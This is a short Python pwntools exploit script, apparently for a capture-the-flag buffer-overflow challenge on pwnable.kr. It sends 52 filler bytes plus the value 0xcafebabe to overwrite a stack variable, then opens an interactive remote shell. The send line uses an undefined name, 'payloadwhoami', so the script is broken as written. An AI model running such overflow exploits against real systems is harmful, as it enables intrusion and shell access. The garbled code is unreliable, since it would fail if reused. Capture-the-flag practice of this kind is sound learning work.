from pwn import *

payload = b'A' * 52 + b'\xbe\xba\xfe\xca'
shell = remote('pwnable.kr',9000)
shell.send(payloadwhoami)
shell.interactive()